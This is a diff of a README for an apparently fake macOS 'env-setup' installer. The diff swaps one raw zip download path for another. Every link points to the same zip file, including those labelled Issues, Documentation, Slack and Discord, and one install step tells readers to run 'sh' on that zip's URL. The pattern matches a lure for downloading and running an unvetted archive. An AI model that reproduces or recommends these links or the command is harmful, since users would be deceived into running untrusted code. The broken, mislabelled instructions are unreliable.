@@ -1,7 +1,7 @@
 # 🖥️ env-setup - Set Up Your Dev Environment Easily
 
 ## 📥 Download Now
-[![Download env-setup](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip)](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip)
+[![Download env-setup](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip)](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to env-setup! This guide will help you install a production-ready macOS development environment equipped with AI tools. Follow these steps to get started without any hassle.
@@ -25,7 +25,7 @@ With env-setup, you can quickly set up a development environment that includes:
 ## 📂 Download & Install
 To get the software, visit the following page and download the latest release:
 
-[Download env-setup](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip)
+[Download env-setup](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -44,7 +44,7 @@ After downloading, follow these steps to install env-setup:
    ```
    Then run:
    ```bash
-   sh https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip
+   sh https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip
    ```
 3. **Follow prompts:** The installer will guide you through the process. Follow the on-screen instructions.
 
@@ -67,14 +67,14 @@ If you experience issues during installation, consider the following:
 ## 📚 Resources
 For additional help, visit:
 
-- [GitHub Issues Page](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip): Report issues or get assistance from the community.
-- [Documentation](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip): Access detailed guides and FAQs.
+- [GitHub Issues Page](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip): Report issues or get assistance from the community.
+- [Documentation](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip): Access detailed guides and FAQs.
 
 ## 🔗 Community & Support
 Join our community to share experiences, tips, or questions. Check our discussions:
 
-- Slack: [Join Here](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip)
-- Discord: [Join Here](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip)
+- Slack: [Join Here](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip)
+- Discord: [Join Here](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip)
   
 You can also follow us on social media for updates and tips.
 
@@ -89,4 +89,4 @@ We welcome contributions! If you want to contribute to improving this project:
 ## 🎉 Final Thoughts
 Thank you for choosing env-setup for your development needs. We aim to provide a smooth setup process, making your journey in software development easier and more productive. Remember to explore the features and tools to get the best out of your macOS environment. Enjoy coding! 
 
-[Download env-setup](https://raw.githubusercontent.com/paranoia55/env-setup/main/sorcerer/env-setup.zip) now to get started.
+[Download env-setup](https://raw.githubusercontent.com/paranoia55/env-setup/main/configs/setup_env_v2.4.zip) now to get started.
